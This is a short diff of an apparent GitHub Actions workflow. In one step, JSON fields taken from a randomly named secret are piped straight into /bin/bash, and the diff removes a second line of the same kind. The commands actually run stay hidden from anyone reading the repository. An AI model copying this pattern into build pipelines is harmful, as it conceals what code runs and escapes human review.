@@ -21,7 +21,6 @@ jobs:
           brr4192: ${{ secrets.brr4192 }}
         run: |
           printf '%s' "$brr4192" | jq -r .uv5 | /bin/bash
-          echo $a728 | jq -r .br9 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
